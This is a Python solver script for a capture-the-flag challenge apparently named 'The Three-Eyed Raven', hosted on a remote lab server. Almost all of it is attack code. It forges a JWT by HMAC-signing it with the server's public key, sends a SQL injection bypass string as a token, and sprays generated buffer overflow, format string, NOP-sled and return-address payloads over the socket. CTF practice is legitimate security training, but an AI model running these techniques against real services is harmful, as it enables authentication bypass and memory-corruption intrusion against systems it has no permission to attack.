#!/usr/bin/env python3
"""
The Three-Eyed Raven - Weirwood Specific
Focus on weirwood binary overflow patterns that don't require Dragonstone completion
"""

import socket
import time
import base64
import json
import hmac
import hashlib
import struct

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def setup_iron_and_face(s):
    """Setup iron and face tokens on existing connection"""
    # Get public key
    s.sendall(b"guest\n")
    time.sleep(0.5)
    guest_response = s.recv(4096).decode('utf-8', errors='ignore')
    
    # Extract public key
    start = guest_response.index("-----BEGIN PUBLIC KEY-----")
    end = guest_response.index("-----END PUBLIC KEY-----") + len("-----END PUBLIC KEY-----")
    public_key = guest_response[start:end]
    
    # Create Face JWT
    key = (public_key + '\n').encode()
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"name": "many-faced", "iat": int(time.time())}
    
    h = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    p = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    signing_input = h + b'.' + p
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
    
    face_jwt = (signing_input + b'.' + sig_b64).decode()
    
    # Offer iron
    iron_token = "' OR '1'='1"
    s.sendall(f"offer iron {iron_token}\n".encode())
    time.sleep(1)
    s.recv(4096)
    
    # Offer face
    s.sendall(f"offer face {face_jwt}\n".encode())
    time.sleep(1)
    s.recv(4096)
    
    return True

def create_weirwood_specific_payloads():
    """Create payloads specifically for weirwood binary overflow"""
    payloads = []
    
    # 1. Classic ret2win patterns (common in CTF binaries)
    # These assume there's a "win" function or flag function
    win_addresses = [
        0x401337,  # Common flag function address
        0x4013a7,  # Another common address
        0x401420,  # Yet another
        0x400000 + 0x1337,  # Base + 1337
        0x400000 + 0x1234,  # Base + 1234
        0x400000 + 0x1337,  # Base + 1337 (flag-like)
    ]
    
    for addr in win_addresses:
        # Try different buffer sizes
        for buf_size in [32, 40, 48, 56, 64, 72, 80, 88, 96, 104, 112, 120, 128]:
            payload = b"A" * buf_size + struct.pack("<Q", addr)
            payloads.append(payload)
    
    # 2. Simple cyclic patterns to find exact offset
    alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for length in range(50, 200, 8):
        pattern = (alphabet * ((length // len(alphabet)) + 1))[:length]
        payloads.append(pattern)
    
    # 3. Specific weirwood/GoT themed overflows
    weirwood_bases = [
        b"weirwood",
        b"heart-tree", 
        b"three-eyed-raven",
        b"bran",
        b"bloodraven",
        b"children-of-forest",
        b"old-gods",
        b"greenseer",
    ]
    
    for base in weirwood_bases:
        for size in [64, 88, 96, 128]:
            if len(base) < size:
                payload = base + b"A" * (size - len(base)) + b"BBBBBBBB"
                payloads.append(payload)
    
    # 4. Format string + overflow combinations
    format_payloads = [
        b"%p" * 20 + b"A" * 50,
        b"%x" * 15 + b"A" * 60,
        b"AAAA" + b"%p" * 10 + b"A" * 40,
    ]
    payloads.extend(format_payloads)
    
    # 5. Shellcode-like patterns (NOP sleds)
    shellcode_patterns = [
        b"\x90" * 64 + b"A" * 8,
        b"\x90" * 88 + b"B" * 8,
        b"\x90" * 100 + b"C" * 8,
        b"\x90" * 32 + b"weirwood" + b"\x90" * 32 + b"D" * 8,
    ]
    payloads.extend(shellcode_patterns)
    
    # 6. Integer overflow patterns
    int_patterns = [
        struct.pack("<Q", 0xffffffffffffffff),  # Max uint64
        struct.pack("<Q", 0x8000000000000000),  # Min int64
        struct.pack("<Q", 0x7fffffffffffffff),  # Max int64
        b"A" * 64 + struct.pack("<Q", 0xdeadbeef),
        b"A" * 88 + struct.pack("<Q", 0xcafebabe),
    ]
    payloads.extend(int_patterns)
    
    # 7. Stack pivot patterns
    stack_patterns = [
        b"A" * 88 + struct.pack("<Q", 0x7fffffffffff),  # High stack addr
        b"A" * 96 + struct.pack("<Q", 0x7fff00000000),  # Stack base
        b"A" * 104 + struct.pack("<Q", 0x400000),       # Code base
    ]
    payloads.extend(stack_patterns)
    
    # 8. Simple flag-triggering patterns
    flag_patterns = [
        b"flag",
        b"FLAG", 
        b"get_flag",
        b"print_flag",
        b"show_flag",
        b"win",
        b"WIN",
        b"success",
        b"victory",
        b"complete",
    ]
    
    for pattern in flag_patterns:
        # Try as standalone
        payloads.append(pattern)
        # Try with padding
        for size in [64, 88, 96]:
            if len(pattern) < size:
                padded = pattern + b"A" * (size - len(pattern))
                payloads.append(padded)
    
    return payloads

def test_weirwood_payloads():
    """Test weirwood-specific payloads"""
    print("[+] Testing weirwood-specific payloads...")
    
    payloads = create_weirwood_specific_payloads()
    print(f"[+] Created {len(payloads)} weirwood-specific payloads")
    
    try:
        s = connect_to_raven()
        
        # Setup iron and face
        if not setup_iron_and_face(s):
            print("[-] Failed to setup iron and face")
            s.close()
            return False
        
        print("[+] Iron and face tokens accepted, testing weirwood payloads...")
        
        for i, payload in enumerate(payloads):
            if i % 25 == 0:
                print(f"[+] Testing payload {i+1}/{len(payloads)}")
            
            # Encode as base64
            b64_payload = base64.b64encode(payload).decode()
            
            s.sendall(f"offer dragon {b64_payload}\n".encode())
            time.sleep(0.3)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            
            # Check for success
            if "SpaceCTF{" in response:
                print(f"\n🎉 FLAG FOUND: {response}")
                print(f"Winning payload {i+1}: {payload[:50]}...")
                s.close()
                return True
            
            if "accepted" in response.lower():
                print(f"\n[!] Dragon payload {i+1} accepted!")
                print(f"Payload: {payload[:50]}...")
                print(f"Response: {response.strip()}")
                
                # Check status
                s.sendall(b"status\n")
                time.sleep(0.5)
                status = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Status: {status}")
                
                if "SpaceCTF{" in status:
                    print(f"\n🎉 FLAG FOUND: {status}")
                    s.close()
                    return True
                
                # If all accepted, try to get flag
                if ("iron   : accepted" in status and 
                    "face   : accepted" in status and 
                    "dragon : accepted" in status):
                    
                    print("[!] ALL THREE OFFERINGS ACCEPTED!")
                    
                    # Try different ways to get the flag
                    flag_commands = ["", "help", "quit", "status"]
                    
                    for cmd in flag_commands:
                        s.sendall(f"{cmd}\n".encode())
                        time.sleep(0.5)
                        cmd_response = s.recv(4096).decode('utf-8', errors='ignore')
                        
                        if "SpaceCTF{" in cmd_response:
                            print(f"\n🎉 FLAG FOUND with '{cmd}': {cmd_response}")
                            s.close()
                            return True
                    
                    print("[!] All offerings accepted - this should give us the flag!")
                    s.close()
                    return True
            
            elif "turns away" not in response and response.strip():
                print(f"[!] Unusual response for payload {i+1}: {response.strip()}")
        
        s.close()
        
    except Exception as e:
        print(f"Error in weirwood test: {e}")
    
    return False

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - WEIRWOOD SPECIFIC")
    print("="*70)
    
    if test_weirwood_payloads():
        print("\n🎉 The Three-Eyed Raven challenge completed!")
    else:
        print("\n❌ Weirwood overflow not found")

if __name__ == "__main__":
    main()